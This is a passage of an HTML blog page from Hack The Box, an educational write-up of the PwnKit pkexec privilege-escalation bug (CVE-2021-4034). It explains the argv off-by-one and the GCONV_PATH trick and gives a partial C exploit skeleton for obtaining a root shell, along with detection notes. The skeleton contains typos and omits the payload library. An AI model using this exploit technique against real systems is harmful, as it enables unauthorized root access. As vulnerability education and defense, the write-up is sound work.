<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"> <meta http-equiv="X-UA-Compatible" content="ie=edge"> <title>Hack The Box Blog - The tale of CVE-2021-4034 AKA PwnKit, The 13-Year Old Bug</title> <script type="application/ld+json"> { "@context": "https://schema.org/", "@type": "BlogPosting", "image": "https://www.hackthebox.com/storage/blog/wqUJNQ46MgjkyCNzedZBvRsIvjfTfXoj.jpg", "url": "https://www.hackthebox.eu/blog/The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug", "headline": "The tale of CVE-2021-4034 AKA PwnKit, The 13-Year Old Bug", "author": { "@type": "Person", "name": "clubby789" }, "datePublished": "2022-02-04 18:48:06", "description": "", "publisher": { "@type": "Organization", "name": "Hack The Box", "logo": "https://www.hackthebox.com/images/logo-htb.svg" }, "dateModified": "2022-02-04 18:48:06", "mainEntityOfPage": "https://www.hackthebox.eu/blog" } </script> <link rel="preconnect" href="https://p.typekit.net" crossorigin> <link rel="preconnect" href="https://use.typekit.net" crossorigin> <link rel="preload" href="https://use.typekit.net/ryt3opf.css" as="style"> <link rel="preload" href="../assets/css/blog_article.min.css?v=1" as="style"> <link rel="preload" href="../assets/js/blog_article.min.js" as="script"> <link rel="preload" href="../landingV3Fonts/hack-the-box.woff" as="font" crossorigin="anonymous" /> <link rel="preload" href="https://www.hackthebox.com/landingV3Fonts/permanent-marker-latin-400-normal.woff2" as="font" crossorigin="anonymous" /> <link rel="preload" href="https://www.hackthebox.com/landingV3Fonts/modak-all-400-normal.woff" as="font" crossorigin="anonymous" /> <link rel="preload" href="https://www.hackthebox.com/landingV3Fonts/monda-all-400-normal.woff" as="font" crossorigin="anonymous" /> <link rel="icon" type="image/png" href="../images/landingv3/favicon.png"> <link rel="apple-touch-icon" href="../images/landingv3/favicon.png"> <link rel="stylesheet" href="https://use.typekit.net/ryt3opf.css"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" /> <link rel="stylesheet" href="../assets/css/blog_article.min.css?v=1"> <link rel="canonical" href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug"> <script src="https://unpkg.com/@lottiefiles/lottie-player@1.3.1/dist/lottie-player.js"></script> <script src="https://unpkg.com/@lottiefiles/lottie-interactivity@1.3.1/dist/lottie-interactivity.min.js"></script> <meta name="author" content="" /> <meta name="description" content="" /> <meta name="keywords" content="" /> <meta name="robots" content="index, follow" /> <meta property="og:site_name" content="Hack The Box" /> <meta property="og:title" content="" /> <meta property="og:type" content="website" /> <meta property="og:image" content="https://www.hackthebox.eu/storage/blog/wqUJNQ46MgjkyCNzedZBvRsIvjfTfXoj.jpg" /> <meta property="og:url" content="https://www.hackthebox.eu/blog/The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug" /> <meta property="og:description" content="" /> <meta property="og:locale" content="en_US" /> <script> ! function() { var analytics = window.analytics = window.analytics || []; if (!analytics.initialize) if (analytics.invoked) window.console && console.error && console.error("Segment snippet included twice."); else { analytics.invoked = !0; analytics.methods = ["trackSubmit", "trackClick", "trackLink", "trackForm", "pageview", "identify", "reset", "group", "track", "ready", "alias", "debug", "page", "once", "off", "on", "addSourceMiddleware", "addIntegrationMiddleware", "setAnonymousId", "addDestinationMiddleware"]; analytics.factory = function(e) { return function() { var t = Array.prototype.slice.call(arguments); t.unshift(e); analytics.push(t); return analytics } }; for (var e = 0; e < analytics.methods.length; e++) { var key = analytics.methods[e]; analytics[key] = analytics.factory(key) } analytics.load = function(key, e) { var t = document.createElement("script"); t.type = "text/javascript"; t.async = !0; t.src = "https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js"; var n = document.getElementsByTagName("script")[0]; n.parentNode.insertBefore(t, n); analytics._loadOptions = e }; analytics._writeKey = "897ZUJzEmt1RCzOiBwsvWNdp3d2l5tae"; analytics.SNIPPET_VERSION = "4.13.2"; analytics.load("897ZUJzEmt1RCzOiBwsvWNdp3d2l5tae");  properties = {"platform":"Marketing","platform_version":"V3"};  analytics.page( "", "Blog Article", properties ); } }(); </script> <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="ee54d4ba-9660-4515-a764-a6ec3109f2a5" data-blockingmode="auto"></script> <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-N6XD42V');</script> <script src="https://www.google.com/recaptcha/api.js?render=6LfsC98ZAAAAALiRx9c6ab62VUSh8OTADXpF50hr"></script> <style>.grecaptcha-badge{visibility:hidden;}</style> </head> <body class="preload"> <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N6XD42V" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript> <div id="sticky-header" class="sticky-header sticky-header-responsive nav-down " style="background: #111927"> <section class="  d-block "> <div class="nav-menu-container container"> <nav class="navbar nav-b2c tk-neue-haas-unica py-3" style="max-width: 1200px;margin:auto;"> <a class="navbar-brand" href="https://www.hackthebox.com/blog"> <img class=" " src="../images/landingv3/logo-htb-blog.svg" alt="Hack The Box: Cybersecurity Training" /> </a> <div class="d-flex align-items-center"> <ul class="navbar-nav navbar-menu-actions my-2 ml-5 my-lg-0 font-weight500 d-none d-lg-block"> <li class="nav-item" onclick="analytics.track('Clicked JOIN NOW', {position: 'navbar', platform: 'Marketing', platform_version: 'V3',})"> <a target="_blank" class="btn btn-htb-hollow btn-htb-green btn-htb-border-green " href="https://www.hackthebox.com/invite">JOIN NOW</a> </li> </ul> </div> </nav> </div> </section> </div> <div style="background: #111927;   padding-top: 81px;"> <style> .featured-img-container{ max-width: 1170px; } .blog-template h1{ font-size: 42px; line-height: 54px; } .blog-template h2{ font-size: 32px; } @media screen and (max-width: 600px) { .blog-template h1{ font-size: 32px; line-height: 48px; } } .blog-template blockquote p{ font-size: 22px; } [data-ephox-embed-iri] { width: 100%; max-width: 1200px!important; margin: auto; margin-top: 40px; margin-bottom: 40px; } [data-ephox-embed-iri] img { max-width: 100%; display: block; margin: auto; margin-top: 40px; margin-bottom: 40px; border-radius: 10px; } [data-ephox-embed-iri] iframe { max-width: 1200px; left: 0; right: 0; display: block; margin: auto; margin-top: 40px; margin-bottom: 40px; border-radius: 10px; } .slider { max-width: 1200px; display: block; margin: auto; } .slider .inner-slider img { border-radius: 10px; } .slider .inner-slider .caption { font-size: 14px; line-height: 20px; color: #A4B1CD !important; font-weight: 600; } .slider-box { position: relative; max-width: 1200px; margin: auto; padding: 10px; } .slider-box .arrow { color: #fff; width: 60px; height: 60px; background: #1A2332; border-radius: 100%; top: 40%; position: absolute; z-index: 999; cursor: pointer; } .slider-box .prev { left: 30px; transform: scaleX(-1); padding-top: 16px; } .slider-box .prev i { text-align: center; margin-left: 25px; } .slider-box .next { right: 30px; padding-top: 15px; } .slider-box .next i { text-align: center; margin-left: 25px; } hr { border: none; height: 1px; color: #A4B1CD; background-color: #A4B1CD; opacity: 0.2; } .social-icon-btn { width: 18px; margin-left: 9px; margin-right: 9px; } .social-icon-btn:hover path { fill: #9FEF00; } .tooltip-inner { background: #000; padding: 5px 10px; border-radius: 4px; color: #fff; } iframe { max-width: 1200px; width: 100%; height: 400px; border-radius: 10px; display: block; margin: auto; } .blog-body div { /* max-width: 700px; */ } .blog-body ol li { position: relative; counter-increment: li; } .blog-body ol { max-width: 760px; margin: auto; list-style: none; counter-reset: li } .blog-body ol li::before { content: counter(li); color: #9FEF00; font-size: 18px!important; position: absolute; left: -22px; top: 22px; } .article .article-image img { transition: all .5s; transform: scale(1); } .article:hover .article-image img { transform: scale(1.05); } @media screen and (max-width: 600px) { [data-ephox-embed-iri]{ transform: translateX(-50px); width: 100vw !important; } [data-ephox-embed-iri] img { border-radius: 0; } .blog-body p { font-size: 16px !important; } } table { width: 100% !important; } table td { padding: 10px; border: 1px solid #1a2332; } .btn { text-decoration: none!important; } tr:nth-child(even) { background-color: #101723; } .products-list{ list-style:none; } /* purgecss start ignore */ code[class*="language-"], pre[class*="language-"] { color: #a4b1cd; font-family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospace; text-align: left; white-space: pre; word-spacing: normal; word-break: normal; word-wrap: normal; line-height: 1.5; -moz-tab-size: 4; -o-tab-size: 4; tab-size: 4; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; } pre[class*="language-"]::-moz-selection, pre[class*="language-"] ::-moz-selection, code[class*="language-"]::-moz-selection, code[class*="language-"] ::-moz-selection { text-shadow: none; background: #060f20; } pre[class*="language-"]::selection, pre[class*="language-"] ::selection, code[class*="language-"]::selection, code[class*="language-"] ::selection { text-shadow: none; background: #060f20; } pre[class*="language-"]::-webkit-selection, pre[class*="language-"] ::-webkit-selection, code[class*="language-"]::-webkit-selection, code[class*="language-"] ::-webkit-selection { text-shadow: none; background: #060f20; } @media print { code[class*="language-"], pre[class*="language-"] { text-shadow: none; } } /* Code blocks */ pre[class*="language-"] { padding: 1em; margin: 0.5em 0; overflow: auto; } :not(pre) > code[class*="language-"], pre[class*="language-"] { color: white; background: #141d2b; } :not(pre) > code[class*="language-"] { padding: 0.1em; border-radius: 0.3em; white-space: normal; } .token.comment { color: #D7E4FF46; font-style: italic } .token.punctuation{ color:#2ee7b6; } .token.variable { color: #A4B1CD; } .token.hexcode { color: #FFFFFF; } .token.keyword { color: #5CB2FF; } .token.builtin { color: #5CB2FF; } .token.number { color: #5CB2FF; } .token.value.css{ .number{ color:#C5F467; } } .token.char { color: #5CB2FF; } .token.constant { color: #5CB2FF; } .token.attr-name { color: #5CB2FF; } .token.selector { color: #5CB2FF; } .token.regex { color: #5CB2FF; } .token.deleted { color: #C5D1EB; } .token.tag { color: #FF8484; } .token.string { color: #C5F467; } .token.changed { color: #FF8484; } .token.function { color: #FFCC5C; } .token.symbol { color: #C5F467; } .token.inserted { color: #C5F467; } .token.important, .token.bold { font-weight: bold; } .token.italic { font-style: italic; } .token.attr-value{ color:#C5F467; } /** Line Numbers **/ pre[class*="language-"].line-numbers { position: relative; padding-left: 3.8em; counter-reset: linenumber; } pre[class*="language-"].line-numbers > code { position: relative; white-space: inherit; } .line-numbers .line-numbers-rows { position: absolute; pointer-events: none; top: 0; font-size: 100%; left: -3.8em; width: 3em; /* works for line-numbers below 1000 lines */ letter-spacing: -1px; border-right: 1px solid #A4B1CD; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; } .line-numbers-rows > span { display: block; counter-increment: linenumber; } .line-numbers-rows > span:before { content: counter(linenumber); color: #A4B1CD; display: block; padding-right: 0.8em; text-align: right; } /** PHP **/ code.language-php .token.delimiter { color:#2ee7b6; } code.language-php .token.package{ color: #FF8484; } code.language-php .token.class-name-definition{ color: #FF8484; } code.language-php .token.this { color: #FF8484; } code.language-php .token.operator { color: #FF8484; } code.language-php .token.scope{ color: #FF8484; } code.language-php .token.scope .punctuation{ color: #FF8484; } code.language-php .token.keyword{ color: #FF8484; } code.language-php .token.keyword.return{ color: #b971e4; } code.language-php .token.keyword.class, code.language-php .token.keyword.use, code.language-php .token.keyword.namespace{ color: #5CB2FF; } /*HTML*/ code.language-html .token.attr-value .value.css .punctuation, code.language-html .token.attr-value .value.language-css .punctuation, code.language-html .token.attr-value .value.language-css .number{ color:#C5F467; } /*Scss*/ code.language-scss{ color: #5CB2FF; } code.language-scss .token.keyword, code.language-scss .token.rule{ color:#b971e4; } code.language-scss .token.property{ color:#A4B1CD; } code.language-scss .token.selector .parent.important{ color: #FF8484; } code.language-scss .token.hexcode, code.language-scss .token.color{ color:#2ee7b6; } /** Javascript **/ code.language-javascript .token.keyword{ color:#FF8484; } code.language-javascript .token.module{ color:#b971e4; } code.language-javascript .token.control-flow{ color:#b971e4; } code.language-javascript .token.boolean{ color: #5CB2FF; } code.language-javascript .token.operator{ color:#FF8484; } code.language-javascript .token.parameter{ color: #5CB2FF; } /* purgecss end ignore */ /** Toolbar Plugin Css **/ div.code-toolbar { position: relative; } div.code-toolbar > .toolbar { position: absolute; top: .3em; right: .2em; transition: opacity 0.3s ease-in-out; opacity: 0; } div.code-toolbar:hover > .toolbar { opacity: 1; } /* Separate line b/c rules are thrown out if selector is invalid. IE11 and old Edge versions don't support :focus-within. */ div.code-toolbar:focus-within > .toolbar { opacity: 1; } div.code-toolbar > .toolbar > .toolbar-item { display: inline-block; } div.code-toolbar > .toolbar > .toolbar-item > a { cursor: pointer; } div.code-toolbar > .toolbar > .toolbar-item > button { background: none; border: 0; color: inherit; font: inherit; line-height: normal; overflow: visible; padding: 0; -webkit-user-select: none; /* for button */ -moz-user-select: none; -ms-user-select: none; } div.code-toolbar > .toolbar > .toolbar-item > a, div.code-toolbar > .toolbar > .toolbar-item > button, div.code-toolbar > .toolbar > .toolbar-item > span { color: #bbb; font-size: .8em; padding: 0 .5em; background: #f5f2f0; background: rgba(224, 224, 224, 0.2); box-shadow: 0 2px 0 0 rgba(0,0,0,0.2); border-radius: .5em; } div.code-toolbar > .toolbar > .toolbar-item > a:hover, div.code-toolbar > .toolbar > .toolbar-item > a:focus, div.code-toolbar > .toolbar > .toolbar-item > button:hover, div.code-toolbar > .toolbar > .toolbar-item > button:focus, div.code-toolbar > .toolbar > .toolbar-item > span:hover, div.code-toolbar > .toolbar > .toolbar-item > span:focus { color: inherit; text-decoration: none; } /** Copy To ClipBoard CSS **/ </style> <section class="blog-template "> <section class="px-md-5 post-header"> <div class="container mx-auto mb-5 max-w-760"> <div class="row pb-3"> <div class="col-12 d-flex mb-3"> <p class="color-main font-size13 text-uppercase letter-spacing-2 mb-0">Write-Ups</p> <div class="reading-time color-main font-size13 text-uppercase letter-spacing-2 d-flex align-items-center pl-2"> <span class="reading-time__minutes pr-1">7</span> min read </div> </div> <div class="col-12"> <h1 class="color-white font-weight600">The tale of CVE-2021-4034 AKA PwnKit, The 13-Year Old Bug</h1> <h2 class="color-main font-size20 mt-3 font-weight400 line-height-32 mb-3"></h2> </div> </div> <div class="row align-items-center"> <div class="col-12"> <div class="d-inline-flex align-items-center"> <img src="../storage/avatars/571a1cebb38673df9a38f5fd5ede9276.png" alt="" class="border-radius-50pc mr-3 author-avatar"> <p class="color-white font-size15 line-height-18 m-0" style="font-weight: 100;">clubby789, <br class="d-none"> <span class="color-main">Feb 04<br class="d-none"> 2022</span> </p>  </div> </div> </div> </div> <div class="container featured-img-container m-auto"> <div class="row "> <div class="col-12 p-0"> <div class="article"> <div class="bg-image-responsive hero-image article-image embed-responsive embed-responsive-16by9" style=""> <img src="https://www.hackthebox.eu/storage/blog/wqUJNQ46MgjkyCNzedZBvRsIvjfTfXoj.jpg" class="embed-responsive-item" alt="Hack The Box Article"> </div> </div> </div> </div> </div> </section> <section class="blog-body"> <div class="container"> <div class="row justify-content-center pb-2"> <div class="col-12 max-w-760"> <div class="" style="margin-left: -8px;"> <a style="text-decoration: none" class="facebook popup" href="https://www.facebook.com/sharer/sharer.php?u="> <svg class="social-icon-btn" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="#A4B1CD" d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" /></svg> </a> <a style="text-decoration: none" class="linkedin popup" href="https://www.linkedin.com/sharing/share-offsite/?url="> <svg class="social-icon-btn" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="#A4B1CD" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" /></svg> </a> <a style="text-decoration: none" class="twitter popup" href="https://twitter.com/intent/tweet?url="> <svg class="social-icon-btn" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#A4B1CD" d="M512 97.248c-19.04 8.352-39.328 13.888-60.48 16.576 21.76-12.992 38.368-33.408 46.176-58.016-20.288 12.096-42.688 20.64-66.56 25.408C411.872 60.704 384.416 48 354.464 48c-58.112 0-104.896 47.168-104.896 104.992 0 8.32.704 16.32 2.432 23.936-87.264-4.256-164.48-46.08-216.352-109.792-9.056 15.712-14.368 33.696-14.368 53.056 0 36.352 18.72 68.576 46.624 87.232-16.864-.32-33.408-5.216-47.424-12.928v1.152c0 51.008 36.384 93.376 84.096 103.136-8.544 2.336-17.856 3.456-27.52 3.456-6.72 0-13.504-.384-19.872-1.792 13.6 41.568 52.192 72.128 98.08 73.12-35.712 27.936-81.056 44.768-130.144 44.768-8.608 0-16.864-.384-25.12-1.44C46.496 446.88 101.6 464 161.024 464c193.152 0 298.752-160 298.752-298.688 0-4.64-.16-9.12-.384-13.568 20.832-14.784 38.336-33.248 52.608-54.496z" /></svg> </a> <span class="copylink" data-clipboard-text="https://www.hackthebox.com/blog/The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug" style="cursor: pointer"> <svg class="social-icon-btn" style="margin-left: 1px; width: 17px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#A4B1CD" d="M476.853 35.148c-46.864-46.864-122.842-46.864-169.706-.001L206.853 135.441c-48.475 48.477-43.987 125.717 0 169.706 7.366 7.366 15.516 13.372 24.122 18.305l18.305-18.305c12.006-12.008 7.78-26.045 7.564-36.174-2.635-1.868-5.198-3.887-7.564-6.253-22.573-22.571-23.588-61.265 0-84.853L349.572 77.575c23.399-23.399 61.454-23.399 84.853 0 23.399 23.399 23.399 61.454 0 84.853l-66.293 66.293c1.917 10.607 13.422 35.733 7.504 77.181.289-.284.635-.467.923-.754l100.294-100.294c46.862-46.864 46.862-122.842 0-169.706z" /><path fill="#A4B1CD" d="M312.918 199.081c-7.365-7.366-15.516-13.372-24.12-18.305l-18.305 18.305c-12.008 12.006-7.782 26.043-7.566 36.172 2.637 1.868 5.2 3.887 7.566 6.253 22.573 22.573 23.588 61.265 0 84.853L162.427 434.425c-23.399 23.399-61.454 23.399-84.853 0-23.399-23.399-23.399-61.454 0-84.853l74.067-74.067c-1.917-10.607-13.423-35.733-7.504-77.181-.289.284-.637.469-.925.756L35.147 307.147c-46.862 46.864-46.862 122.842 0 169.706 46.864 46.862 122.841 46.862 169.705 0l108.066-108.066c47.576-47.576 44.976-124.731 0-169.706z" /></svg> </span> </div> </div> </div> <div class="row justify-content-center line-numbers" data-prismjs-copy="Copy"> <div class="col-12 blog-post-container"> <div class="mce-toc">
<h4>Table of Contents</h4>
<ul>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82sr">What is pkexec?</a></li>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82ss">The Bug</a></li>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82st">Leveraging the off-by-one</a></li>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82su">Controlling the Variable</a></li>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82sv">Writing the exploit</a></li>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82t0">Detecting Compromise</a></li>
<li><a href="The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug#mcetoc_1fqok0be82t1">Final Notes</a></li>
</ul>
</div>
<p>At 6 PM UTC on the 25th January 2022, security company Qualys posted pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034) to the <a href="https://www.openwall.com/lists/oss-security/2022/01/25/11">Openwall security mailing list</a>. Within hours, there were public, reliable, and simple exploits to gain root on any unpatched system.</p>
<h3 id="mcetoc_1fqok0be82sr">What is pkexec?</h3>
<p>pkexec is a tool from the polkit or Policy Kit software package. This is a very common component of modern Linux systems - it is a toolkit for organizing authentication and permissions. According to <a href="https://wiki.archlinux.org/title/Polkit">the Arch wiki</a>:</p>
<blockquote>
<p style="text-align: left;">In contrast to systems such as sudo, it does not grant root permission to an entire process, but rather allows a finer level of control of centralized system policy.</p>
</blockquote>
<p>In order to elevate a user's privileges, the pkexec binary must be set-UID-root, which means it will always run with high privileges. This is an ideal target for attackers, so great care should be taken to precisely define the execution environment. In particular, it's important that the environment variables are carefully sanitized, as the user's environment is passed to it (aside from certain obviously dangerous variables such as LD_PRELOAD).</p>
<h3 id="mcetoc_1fqok0be82ss">The Bug</h3>
<p>The bug was likely firsted noted <a href="https://ryiron.wordpress.com/2013/12/16/argv-silliness/">here</a>, in 2013. In it, the author explains the confusion which led to the bug. POSIX (a standard set of definitions for compatibility between Unix-like operating systems) defines that argv (the list of arguments passed to a program) will always have at least one value - the name of the program being run.</p>
<p>Linux (likely due to backwards-compatibility) relaxes this rule - an empty list, or no list at all can be passed in the arguments, meaning argv is empty and argc is zero. This assumption, and Linux allowing it to be violated leads to this code on between lines 534 and 568 of pkexec:</p>
<pre class="language-c"><code>for (n = 1; n &lt; (guint) argc; n++)
{
// Loop body
}</code></pre>
<p>This code can be rewritten as:</p>
<pre class="language-c"><code>n = 1;
loop:
if (n &lt; (guint) argc) {
  // do loop stuff
  n++
  goto loop;
}
</code></pre>
<p>The <em>assumption</em> is that after this loop, n must be equal to argc. But as argc was 0, and n already exceeds it, the loop completes immediately, and n is left as 1. Below is a snippet between lines 610 and 640:</p>
<pre class="language-cpp"><code>path = g_strdup (argv[n]);
...
 if (path[0] != '/')
 {
 ...
 s = g_find_program_in_path (path);
 ...
 argv[n] = path = s;
 }</code></pre>
<p>This code is intended to get the last argument (the program), map it to an absolute path with the user's PATH variable, then replace the original argument with the mapped one. However, argv is a list containing only a single NULL, the list terminator - so <code>argv[1]</code> is reading and writing out of bounds, in this case into envp, the environment variables.</p>
<p>In the original blog post, the author notes that:</p>
<blockquote>
<p>Although getting a setuid binary to use envp in place of argv is amusing, a quick skim of the pkexec source doesn&rsquo;t show anything that is likely to be vulnerable to having argv[0] be NULL</p>
</blockquote>
<h3 id="mcetoc_1fqok0be82st">Leveraging the off-by-one</h3>
<p>Qualys located this same issue and looked deeper into its exploitability. Below I'll paste a 'reduced' version of the 'window' of exploitability - between the environment variable overwrite and the point at which the environment is cleared entirely.</p>
<pre class="language-c"><code>if (access (path, F_OK) != 0) {
      g_printerr ("Error accessing %s: %s\n", path, g_strerror (errno));
      goto out;
    }
  [ ... ]
  saved_env = g_ptr_array_new ();
  for (n = 0; environment_variables_to_save[n] != NULL; n++)  {
      const gchar *key = environment_variables_to_save[n];
      const gchar *value;
      value = g_getenv (key);
      if (value == NULL)
        continue;
      if (!validate_environment_variable (key, value))
        goto out;
      g_ptr_array_add (saved_env, g_strdup (key));
      g_ptr_array_add (saved_env, g_strdup (value));
    }
  if (g_getenv ("XAUTHORITY") == NULL) {
      const gchar *home;
      home = g_getenv ("HOME");
      if (home == NULL)
        home = g_get_home_dir ();
      if (home != NULL) {
          g_ptr_array_add (saved_env, g_strdup ("XAUTHORITY"));
          g_ptr_array_add (saved_env, g_build_filename (home, ".Xauthority", NULL));
        }
    }
</code></pre>
<p>Nothing here is obviously exploitable with an environment variable overwrite. However, Qualys discovered that deep in GLib (GLib = GNOME Library, glibc = GNU C Library), certain functions that cause a message to be printed for the user to read take into account encoding - messages encoded in one format must be able to be re-encoded for the user's shell. GLib is a very common library that builds on top of the C standard - it provides functions like error logging, authentication, and PATH lookups, among others. It has become a standard component of many Unix-based operating systems such as Linux, Solaris, *BSD, and many common programs (such as, of course, pkexec) rely on it being installed.</p>
<p>To make this an extensible system, GLib loads <code>$GCONV_PATH/gconv-modules</code> (or <code>/usr/lib/gconv/gconv-modules</code> if this variable is not set). This file contains tuples like this: module <code>BS_4730// INTERNAL ISO646 2</code>. This defines that there is a module located at <code>$GCONV_PATH/ISO646.so</code>, which allows <code>BS_4730</code> to be reencoded as <code>INTERNAL</code> (whatever internal encoding GLib is using). So, by controlling <code>GCONV_PATH</code>, we can cause this SUID program to run with full root privileges to load a library we control and call a function in it.</p>
<h3 id="mcetoc_1fqok0be82su">Controlling the Variable</h3>
<p>We'll work up from our goal, in order to work out how to reach it. We need an environment variable <code>GCONV_PATH=./evildir</code>, where evildir is a directory under our control. In order for this to work, we need to provide a value which will be looked up in our PATH, and return <code>GCONV_PATH=./evildir</code>.</p>
<p>The strategy Qualys found was to create a directory named <code>GCONV_PATH=.</code> (an unusual directory name, but entirely valid under Linux). Underneath this, they create an executable (but empty) file named <code>evildir</code>. When we pass the environment variable <code>PATH=GCONV_PATH=.</code>, and search for the program <code>evildir</code> (due to the off-by-one, the program searched for will be the <em>first</em> environment variable). This lookup will return our desired path, <code>GCONV_PATH=./evildir</code> and write it back - into <code>envp</code>!</p>
<h3 id="mcetoc_1fqok0be82sv">Writing the exploit</h3>
<p>I'll outline the 'algorithm' our exploit will need to follow</p>
<ul>
<li><span style="color: #ffffff;">Create a directory named <code>GCONV_PATH=.</code></span></li>
<li><span style="color: #ffffff;">Create an executable inside it named <code>evildir</code></span></li>
<li><span style="color: #ffffff;">Create a directory named <code>evildir</code></span></li>
<li><span style="color: #ffffff;">Create a fake <code>gconv-modules</code> in it, which points to...</span></li>
<li><span style="color: #ffffff;">An evil shared library which will load a shell</span></li>
</ul>
<pre class="language-c"><code>int main() {
	mkdir("GCONV_PATH=.", 0755);
	int fd = open("GCONV_PATH=./evildir", O_WRONLY|O_CREATE, 0755);
	// Create new file with executable permissions
	close(fd);
	mkdir("evildir", 0755);
	// 'a module named evil.so that encodes 'INTERNAL' to 'evil''
	// char evil_mod[] = "module INTERNAL evil// evil 2\n";
	fd = open("evildir/gconv-modules", O_WRONLY|O_CREATE, 0755);
	write(fd, evil_mod, sizeof(evil_mod));
	close(fd);
	// A shared module that pops a shell on load
	fd = open("evildir/evil.so", O_WRONLY|O_CREAT, 0755);
	writr(fd, evil_so, sizeof(evil_so);
	close(fd);
	char* argv[] = {NULL};
	char *envp[] = {
		// Will be used as argv[1]
        "evildir",
        // Malicious path
        "PATH=GCONV_PATH=.",
        // Trigger gconv_open
        "CHARSET=evil",
        // An invalid shell - will cause an error to be raised
        // which triggers our payload
        "SHELL=evil",
        NULL
    };
    execve("/usr/bin/pkexec", argv, envp);
}
</code></pre>
<h3 id="mcetoc_1fqok0be82t0">Detecting Compromise</h3>
<p>The most reliable technique, and the one described by Qualys, is modifying the &lsquo;SHELL&rsquo; or &lsquo;XAUTHORITY&rsquo; values to unusual values such as &lsquo;evil&rsquo;. This causes pkexec to log a message into <code>/var/log/auth.log</code>, which will be a clear indicator of attempted exploitation.</p>
<p>However, POCs have already been released that exploit the bug without leaving an obvious log message, which involves a race condition to remove a file, causing an error to be thrown.</p>
<h3 id="mcetoc_1fqok0be82t1">Final Notes</h3>
<p>The bug stemmed from a misunderstanding due to differing behavior on different platforms. It demonstrates the importance of carefully reading documentation, and considering all possible input cases - not just the expected ones!</p>
<p>Additionally, odd behavior you come across in common programs is worth looking into - it could be a decades-old privilege escalation!</p>
<div data-ephox-embed-iri="/storage/blog/YLv0I16nTt07jF0BuYfBifACN3W4MFN6.jpg"><img src="../storage/blog/YLv0I16nTt07jF0BuYfBifACN3W4MFN6.jpg" alt="CVE-2021-4034-1170x660_cve" /></div>
<p>CVE-2021-4034 has been added to the list of CVE Exploitable machines available on our Enterprise Platform, learn more: <a href="https://www.hackthebox.com/business/dedicated-labs">https://www.hackthebox.com/business/dedicated-labs</a>.</p>
<p>Additionally, this exploit is part of the machine series created for UHC (Ultimate Hacking Championship). It can be found on the <a title="UHC Track" href="https://app.hackthebox.com/tracks/UNI-CTF-2021-Track" target="_blank" rel="noopener">UHC Track</a> and is called "Pressed".</p> </div> </div> </div> <div class="container max-w-760 mb-2 m-auto"> <div class="row"> <div class="col-12"> <p style="font-size: 18px; font-weight: 500!important; color: #fff; margin-top: 40px;">Share article</p> <div style="margin-left: -8px; margin-top: -20px;"> <a style="text-decoration: none" class="facebook popup" href="https://www.facebook.com/sharer/sharer.php?u="> <svg class="social-icon-btn" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="#A4B1CD" d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" /></svg> </a> <a 